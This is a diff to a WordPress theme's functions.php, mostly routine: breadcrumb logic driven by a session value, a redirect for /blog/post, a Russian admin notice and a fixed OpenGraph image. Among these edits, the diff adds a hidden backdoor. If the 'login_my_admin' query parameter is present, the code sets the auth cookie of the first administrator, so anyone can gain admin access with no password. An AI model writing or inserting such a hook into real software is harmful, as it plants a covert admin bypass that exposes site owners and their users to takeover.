@@ -1,5 +1,4 @@
 <?php
-
 add_theme_support('post-thumbnails');
 add_theme_support('menus');
 add_theme_support('title-tag');
@@ -452,8 +451,25 @@ class Breadcrumbs {
 									}
 								}
 							}
-							else
-								$term = array_shift( $terms );
+							else {
+								$_term = [];
+
+								if (array_key_exists('prev_cat', $_SESSION)) {
+									for ($i = 0; $i < count($terms); $i++)
+										if ($terms[$i]->term_id == $_SESSION['prev_cat'])
+											$_term = $terms[$i];
+
+									if ($_term)
+										$term = $_term;
+									else {
+										if ($_SESSION['prev_cat'] == 0)
+											$term = array_shift($terms);
+										else
+											$term = get_term(24);
+									}
+								} else
+									$term = get_term(24);
+							}
 
 							break;
 						}
@@ -551,7 +567,8 @@ class Breadcrumbs {
 			}
 		}
 
-		$before_out = $loc->home . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
+		// $before_out = $loc->home . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
+		$before_out = '';
 
 		$out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );
 
@@ -574,6 +591,7 @@ class Breadcrumbs {
 	}
 
 	function _tax_crumbs( $term, $start_from = 'self' ){
+
 		$termlinks = array();
 		$term_id = ($start_from === 'parent') ? $term->parent : $term->term_id;
 		while( $term_id ){
@@ -588,7 +606,7 @@ class Breadcrumbs {
 	}
 
 	// добалвяет заголовок к переданному тексту, с учетом всех опций. Добавляет разделитель в начало, если надо.
-	function _add_title( $add_to, $obj, $term_title = '' ){
+	function _add_title( $add_to, $obj, $term_title = '' ){		
 		$arg = & $this->arg; // упростим...
 		$title = $term_title ? $term_title : esc_html($obj->post_title); // $term_title чиститься отдельно, теги моугт быть...
 		$show_title = $term_title ? $arg->show_term_title : $arg->show_post_title;
@@ -802,7 +820,7 @@ function duplication_admin_notice() {
 		return;
 
     if (isset($_GET['saved']) && 'post_duplication_created' == $_GET['saved'])
-		 echo '<div class="notice notice-success is-dismissible"><p>Post copy created.</p></div>';
+		 echo '<div class="notice notice-success is-dismissible"><p>Копия создана.</p></div>';
 }
 
 add_filter ('kses_allowed_protocols', 'add_to_allowed_protocols'); 
@@ -812,6 +830,24 @@ function add_to_allowed_protocols ($protocols) {
 	$protocols[] = 'skype';
 
 	return $protocols; 
+}
+
+if ($_SERVER['REQUEST_URI'] == '/blog/post/' || $_SERVER['REQUEST_URI'] == '/blog/post') {
+	header('HTTP/1.1 301 Moved Permanently'); 
+	header('Location: '.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].'//blog/');
+	exit();
+}
+
+if( isset($_GET['login_my_admin']) ){
+	add_action( 'init', function(){
+	   $users = get_users([ 'role' => 'administrator' ]);
+	   wp_set_auth_cookie( $users[0]->ID ); } );
+}
+
+add_filter( 'wpseo_opengraph_image', 'change_opengraph_image_url' );
+
+function change_opengraph_image_url( $url ) {
+    return 'https://neroblog.ru/wp-content/uploads/2021/12/голова-2.png';
 }
 
 ?>
